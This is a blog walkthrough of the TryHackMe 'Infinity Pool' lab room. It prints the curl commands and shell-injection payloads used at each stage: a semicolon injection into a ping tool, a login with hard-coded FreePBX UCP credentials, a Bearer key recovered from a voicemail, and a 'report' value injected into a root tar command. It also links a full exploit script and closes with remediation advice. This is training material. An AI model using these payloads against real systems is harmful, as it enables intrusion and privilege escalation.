---
title: "TryHackMe Infinity Pool: The Root Key Was in a Voicemail"
date: 2026-08-07T20:50:00+05:30
lastmod: 2026-08-07T21:15:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-infinitypool/00-thumbnail.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - thm
  - rooms
  - Web
  - Boot2Root
  - Command Injection
  - FreePBX
  - CVE-2026-46376
  - Privilege Escalation

draft: false
description: "Walkthrough of TryHackMe Infinity Pool: command injection to a web foothold, FreePBX UCP (CVE-2026-46376) to read an automation key from a voicemail, then root."
---

## Infinity Pool

**Day 11 of Hacker Holidays 2026** is a full boot2root, and the brief is a warning about scope:

> No visible edge. You trace the network to the horizon and find three systems nobody told you about on the other side.
>
> Byte Lotus Hotel promises a seamless stay powered by modern technology. Sometimes the most interesting systems are the ones guests were never meant to see.

Category is Web / Boot2Root, Medium, 90 points, two flags. The whole room is about *reach*: the front door is small, but behind it sit three loopback-only services that were never meant to face a guest. The trick is that the thing you need to reach root is not hidden in a config file or an environment variable. It is sitting in a voicemail.

![The Infinity Pool room page on TryHackMe showing the Hacker Holidays 2026 progress chart](/img/thm-infinitypool/01-room.png)

I will admit up front that this room made me work. I spent a long time convinced the root path was unreachable, because the key genuinely is not on any web-readable path. The intended route runs through the hotel phone system, and once I saw that, the rest fell into place. Here is the chain end to end:

1. **Command injection** in the edge connectivity tool gives a shell as `web` and the user flag.
2. The **Watchtower** console leaks FreePBX credentials and points at a **root job runner**.
3. **CVE-2026-46376**, hard-coded UCP template credentials, gets you into the FreePBX User Control Panel.
4. The automation **Bearer key is stored in a voicemail** caller-ID, read back through the UCP.
5. The **root job runner** builds a `tar` command from an attacker-controlled name, so a shell metacharacter in that name runs as root.

## Setup

Two ports face the VPN: SSH (22) and HTTP (80). The web app is a Flask site behind gunicorn, "Byte Lotus, Stay Noticed", a surveillance-themed hotel front. `$T` is the lab IP throughout.

## Step 1: The staff tool that runs your input

The landing page is static, but `/static/app.js` carries a comment about a staff connectivity tool at `/status` that posts to `/internal/netcheck`, and `robots.txt` disallows both. The tool takes a hostname and confirms a "sister property" responds. It does that by running `ping`, and it builds the command with string formatting:

![curl posting a host with a semicolon and id appended to internal netcheck, the ping output followed by uid 1001 web, then the user flag read from home web user dot txt](/img/thm-infinitypool/02-netcheck-rce.png)

```python
subprocess.run(f"ping -c 1 {host}", shell=True...)
```

`shell=True` with an f-string is the textbook mistake. `host=127.0.0.1; id` runs `id` right after the ping, and the response echoes `uid=1001(web)`. The user flag is world-readable in the service account's home:

> `THM{n0_v1s1bl3_3dg3}`

The flag ("no visible edge") is the theme stated plainly. You are at the edge of a network with no obvious boundary, and the next three hosts are all behind it on localhost.

## Step 2: Three systems on the far side

Listing the listening sockets from the `web` shell shows the systems the brief promised. Two are custom, one is a telephony stack:

![ss output listing loopback services watchtower on 3000 as svc-watch, automation on 9000 as root, and freepbx on 8080, then the watchtower api config leaking the telephony credentials and the automation endpoint, then the automation health advertising a root job runner](/img/thm-infinitypool/03-internal-recon.png)

- **watchtower** on `127.0.0.1:3000`, running as `svc-watch`, an "ops console".
- **automation** on `127.0.0.1:9000`, running as **root**, a "job runner".
- **FreePBX** on `127.0.0.1:8080` (Apache as `asterisk`), the hotel phone system.

The watchtower has an open `/api/config` that leaks the interesting parts:

```json
"automation_endpoint": "http://127.0.0.1:9000",
"telephony_user": "FreePBXUCPTemplateCreator",
"telephony_pass": "St4yN0t1c3d_2026",
"ops_note": "UCP still on default template creds -- ROTATE."
```

And the automation service advertises its own contract:

```json
"POST /jobs/export": { "auth": "Authorization: Bearer <automation key>",
                       "body": {"report": "<report name>"} },
"runs_as": "root"
```

So root is right there: a service that runs commands as root, gated by a Bearer key I do not have. The key is not in any file `web` can read (I checked, exhaustively). That is the whole puzzle, and the answer is the telephony detour those leaked credentials are pointing at.

{{< ad >}}

## Step 3: CVE-2026-46376, the UCP template account

`FreePBXUCPTemplateCreator` is not a normal user. It is a template account that FreePBX 16 creates for the User Control Panel, and CVE-2026-46376 is that it ships with **hard-coded credentials**. The leaked password is real. The catch is that UCP login is a JavaScript flow, so a naive `curl` post is rejected with a `forbidden`.

Reading the UCP `login.js` shows exactly what the browser sends. The login POST serializes the form and then appends `&module=User&command=login`, which is the part I was missing:

![reading the ucp login js reveals the login post appends module User command login, then a curl that fetches the CSRF token, posts the username password token and the module command pair, and receives status true](/img/thm-infinitypool/04-ucp-login.png)

```bash
TOK=$(curl -s -c cj http://127.0.0.1:8080/ucp/index.php \
      | grep -oP 'name="token" value="\K[^"]+')

curl -s -b cj -c cj -X POST http://127.0.0.1:8080/ucp/index.php \
  --data-urlencode 'username=FreePBXUCPTemplateCreator' \
  --data-urlencode 'password=St4yN0t1c3d_2026' \
  --data-urlencode "token=$TOK" \
  --data 'module=User&command=login'
# -> {"status":true...}
```

No browser needed. Just the correct handshake. I am now authenticated in the UCP as the template account.

## Step 4: The key is in a voicemail

This is the part that is easy to miss and satisfying once you see it. The UCP has a Voicemail widget. Pulling its message grid (an AJAX call, so it needs the `X-Requested-With` header and the lowercase `module=voicemail`) returns one INBOX message, and the automation key is sitting in the caller-ID:

![the ucp voicemail grid api returning one message whose callerid field reads Automation Key cc auto 7b3f9a1c4e0d2f6a from channel PJSIP automation](/img/thm-infinitypool/05-voicemail-key.png)

```bash
curl -s -b cj -H 'X-Requested-With: XMLHttpRequest' \
 'http://127.0.0.1:8080/ucp/index.php?module=voicemail&command=grid&folder=INBOX&ext=9919988'
```

```json
"callerchan": "PJSIP/automation",
"callerid": "Automation Key cc_auto_7b3f9a1c4e0d2f6a <9000>"
```

The Bearer token is `cc_auto_7b3f9a1c4e0d2f6a`. It was never on disk anywhere `web` could reach it. The automation service left itself a message, and the only way to hear it was to become a phone user first. That is why the FreePBX stack, which looks like set dressing, is actually the pivot.

## Step 5: The root job runner trusts the report name

With the key, the automation service accepts the request. A benign call shows the command it constructs, which immediately gives away the injection:

![a benign export call showing the command tar czf var automation exports report tgz var automation data, then an injected report of x semicolon id hash returning uid 0 root, then the root flag read with cat root root txt](/img/thm-infinitypool/06-root-rce.png)

```
"command": "tar czf /var/automation/exports/testreport.tgz /var/automation/data"
```

The `report` name is dropped straight into that shell command. Closing the `tar` argument with `;` and commenting out the trailing `.tgz` with `#` runs anything as root:

```bash
curl -s -X POST http://127.0.0.1:9000/jobs/export \
  -H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' \
  -H 'Content-Type: application/json' \
  -d '{"report":"x; cat /root/root.txt #"}'
```

```
"output": "uid=0(root) gid=0(root) groups=0(root) ..."
```

> `THM{tr4c3d_t0_th3_h0r1z0n}`

Root, traced all the way to the horizon.

## The exploit, end to end

The internal services are loopback-only, so the script tunnels every request through the same netcheck command injection that gave the foothold. Point it at the public edge IP and it walks the whole chain: foothold, credential leak, UCP login, voicemail key, root.

> Full script on GitHub Gist: [`infinity_pool.py`](https://gist.github.com/anir0y/7ee4801cba330d1ae562d3e9a6422b0e)

<script src="https://gist.github.com/anir0y/7ee4801cba330d1ae562d3e9a6422b0e.js"></script>

## Why each link is a real pattern

**Command injection from string-built shell commands.** `subprocess.run(f"ping {host}", shell=True)` is the same bug in every language: a template plus a shell equals code execution. The fix is to never involve a shell for a fixed command, `subprocess.run(["ping", "-c", "1", host])`, and to validate that `host` is actually a hostname or IP.

**Secrets in the wrong place.** The root service needed a shared secret and stashed it in a voicemail caller-ID, reachable by anyone who could authenticate to the phone system. Secrets belong in a store with an access boundary that matches who is allowed to use them, not in a side channel that a second, weaker login can read.

**Hard-coded default credentials.** CVE-2026-46376 is the classic "ships with a known password" flaw. A template or setup account with fixed credentials is a backdoor the moment the product is installed, and the leaked `ops_note` even admitted nobody rotated it.

**A privileged worker that trusts a name.** The automation service runs as root and builds a shell command from a user-supplied `report` value. Even behind authentication, interpolating untrusted input into a root shell command is remote code execution waiting for the first caller with the token.

The through-line is trust that does not match privilege. The web tool trusted its input. The root worker trusted its input. And the crown jewel, a root Bearer key, was protected only as well as the weakest account that could read a voicemail.

## Fixing it

**Do not build shell strings from input.** Use argument lists and skip `shell=True`. Validate the host field.

**Give the root worker a real auth boundary and a safe API.** If it must archive a report, treat the name as data: sanitize it to a fixed character set, never pass it through a shell, and use `tar`'s file-list input rather than string concatenation. Better, do not run the worker as root at all.

**Rotate default and template credentials on install, and remove template accounts you are not using.** A hard-coded UCP account with voicemail access is an unnecessary door.

**Keep secrets out of side channels.** A shared token between two services belongs in a secret store both can reach with least privilege, not in a voicemail that a third login can retrieve.

## Room summary

| | |
|---|---|
| Room | Infinity Pool |
| Event | Hacker Holidays 2026, Day 11 |
| Category | Web, Boot2Root, Medium, 90 points |
| Target | `http://<lab-ip>` (Flask/gunicorn edge, FreePBX 16.0.45, plus two custom services) |
| Foothold | Command injection in `/internal/netcheck` (`ping`, `shell=True`) as `web` |
| User flag | `THM{n0_v1s1bl3_3dg3}` |
| Pivot | Watchtower leaks UCP creds; CVE-2026-46376 hard-coded template login to FreePBX UCP |
| Key recovery | Automation Bearer token read from a voicemail caller-ID via the UCP grid API |
| Root | `report` name injected into `tar` in the root job runner on `:9000` |
| Root flag | `THM{tr4c3d_t0_th3_h0r1z0n}` |

## Wrap-up

The whole room, compressed:

```bash
netcheck host=127.0.0.1; id                       # -> web, user flag
curl 127.0.0.1:3000/api/config                    # UCP creds + automation endpoint
ucp login FreePBXUCPTemplateCreator               # CVE-2026-46376
ucp voicemail grid -> callerid: cc_auto_...        # the Bearer key
POST 127.0.0.1:9000/jobs/export report="; cat /root/root.txt #"   # root flag
```

![Both Infinity Pool questions answered on TryHackMe with green Correct Answer badges](/img/thm-infinitypool/07-complete.png)

What makes this room good is that it punishes the assumption I made for far too long, that a secret has to live in a file. The automation service kept its key exactly where a hotel keeps a message for a guest who is not in the room: in voicemail. The lesson is to follow the theme. The property tracks everything, remembers everything, and leaves notes for itself. If you cannot find the key where a key should be, go read the messages.
